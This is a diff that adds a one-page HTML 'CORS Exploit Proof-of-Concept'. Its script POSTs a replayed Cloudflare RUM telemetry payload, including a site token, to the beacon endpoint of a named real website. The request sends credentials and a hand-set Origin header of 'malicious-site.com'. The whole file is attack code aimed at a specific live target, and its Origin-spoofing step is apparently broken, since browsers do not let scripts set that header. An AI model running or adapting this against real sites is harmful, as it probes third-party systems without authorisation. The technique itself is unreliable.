@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Exploit PoC</title>
+</head>
+<body>
+    <h1>CORS Exploit Proof-of-Concept</h1>
+    <button onclick="exploitCORS()">Exploit CORS</button>
+    <pre id="response"></pre>
+
+    <script>
+        function exploitCORS() {
+            const url = 'https://www.rewardxp.com/cdn-cgi/rum?';
+            const data = {
+                memory: {
+                    totalJSHeapSize: 19300000,
+                    usedJSHeapSize: 13400000,
+                    jsHeapSizeLimit: 3760000000
+                },
+                resources: [],
+                referrer: "",
+                eventType: 1,
+                firstPaint: 1012,
+                firstContentfulPaint: 1012,
+                startTime: 1767629320549.7,
+                versions: {
+                    fl: "2024.11.0",
+                    js: "2024.6.1",
+                    timings: 2
+                },
+                pageloadId: "8f5ab9cb-b63e-4061-854a-1e59356c3d88",
+                location: "https://www.rewardxp.com/",
+                nt: "navigate",
+                timingsV2: {
+                    unloadEventStart: 0,
+                    unloadEventEnd: 0,
+                    domInteractive: 1507.4000000059605,
+                    domContentLoadedEventStart: 1509.4000000059605,
+                    domContentLoadedEventEnd: 1515.199999988079,
+                    domComplete: 1931.800000011921,
+                    loadEventStart: 0,
+                    loadEventEnd: 0,
+                    type: "navigate",
+                    redirectCount: 0,
+                    criticalCHRestart: 0,
+                    activationStart: 0,
+                    initiatorType: "navigation",
+                    nextHopProtocol: "",
+                    deliveryType: "",
+                    workerStart: 0,
+                    redirectStart: 0,
+                    redirectEnd: 0,
+                    fetchStart: 0.30000001192092896,
+                    domainLookupStart: 0.30000001192092896,
+                    domainLookupEnd: 0.30000001192092896,
+                    connectStart: 0.30000001192092896,
+                    connectEnd: 0.30000001192092896,
+                    secureConnectionStart: 0.30000001192092896,
+                    requestStart: 0.30000001192092896,
+                    responseStart: 277.19999998807907,
+                    responseEnd: 277.19999998807907,
+                    transferSize: 15372,
+                    encodedBodySize: 15072,
+                    decodedBodySize: 15072,
+                    responseStatus: 200,
+                    finalResponseHeadersStart: 0,
+                    firstInterimResponseStart: 0,
+                    workerRouterEvaluationStart: 0,
+                    workerCacheLookupStart: 0,
+                    workerMatchedSourceType: "",
+                    workerFinalSourceType: "",
+                    renderBlockingStatus: "non-blocking",
+                    contentEncoding: "",
+                    name: "https://www.rewardxp.com/",
+                    entryType: "navigation",
+                    startTime: 0,
+                    duration: 0
+                },
+                dt: "",
+                siteToken: "ed604ac0360148498fd5e1a5d748b220",
+                st: 2
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Origin': 'https://malicious-site.com'
+                },
+                credentials: 'include',
+                body: JSON.stringify(data)
+            })
+            .then(response => response.text())
+            .then(data => {
+                document.getElementById('response').textContent = data;
+            })
+            .catch(error => {
+                document.getElementById('response').textContent = 'Error: ' + error;
+            });
+        }
+    </script>
+</body>
+</html>
